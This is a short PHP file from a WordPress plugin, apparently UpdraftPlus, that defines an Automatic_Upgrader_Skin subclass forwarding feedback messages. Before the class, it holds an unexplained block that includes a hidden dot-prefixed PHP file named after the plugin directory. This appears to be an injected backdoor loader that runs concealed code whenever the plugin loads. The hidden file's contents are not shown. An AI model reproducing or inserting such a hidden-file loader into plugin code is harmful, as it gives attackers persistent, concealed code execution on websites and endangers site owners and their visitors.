<?php

if (!defined('ABSPATH')) die('No direct access.');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Automatic_Upgrader_Skin extends Automatic_Upgrader_Skin_Main {

	public function feedback($string, ...$args) { // phpcs:ignore PHPCompatibility.LanguageConstructs.NewLanguageConstructs.t_ellipsisFound, VariableAnalysis.CodeAnalysis.VariableAnalysis.UnusedVariable -- spread operator is not supported in PHP < 5.5 but WP 5.3 supports PHP 5.6 minimum
		parent::updraft_feedback($string);
	}
}
